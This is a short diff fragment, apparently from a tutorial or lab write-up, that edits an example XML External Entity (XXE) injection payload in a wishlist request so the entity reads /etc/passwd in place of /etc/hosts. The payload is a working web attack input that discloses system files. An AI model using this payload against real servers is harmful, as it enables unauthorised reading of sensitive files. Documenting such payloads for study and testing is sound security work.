@@ -12,7 +12,7 @@
 
 ```
 <!--?xml version="1.0" ?-->
-<!DOCTYPE foo [<!ENTITY payload SYSTEM "/etc/hosts"> ]>
+<!DOCTYPE foo [<!ENTITY payload SYSTEM "/etc/passwd"> ]>
 <wishlist>
   <user_id>1</user_id>
      <item>
